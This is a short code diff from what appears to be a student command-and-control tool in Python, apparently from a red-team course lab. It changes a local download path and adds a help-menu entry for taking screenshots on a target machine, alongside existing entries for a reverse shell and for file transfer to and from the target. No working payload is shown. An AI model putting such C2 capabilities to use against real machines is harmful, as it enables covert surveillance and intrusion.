@@ -27,7 +27,7 @@ def ss(session):
     print("recieved path")  #TODO DELETE
     print(path) #TODO DELETE
 
-    download_path = 'C:\\Users\\Ziya\\Desktop\\study\\AKM\\RED\\python for red\\lab\\final\\Command-Control\\ss'
+    download_path = 'C:\\Users\\Student\\Desktop\\piton\\Command-Control\\main\\ss' #CHANGE THIS PATH
 
     download(from_=path, where=download_path, session=session)
     print("done!")
@@ -72,7 +72,8 @@ def session_help():
     print("""
     download    Usage: 'download <from(target's path)> <where(your path)>'
     upload      Usage:  'upload <where(your path)> <from(target's path)>'
-    shell       Opens reverse shell on agent      
+    shell       Opens reverse shell on agent    
+    ss          Takes screenshoot on target machine and sends it to the server
     exit        exiting from current session
     help        shows this page
     """)
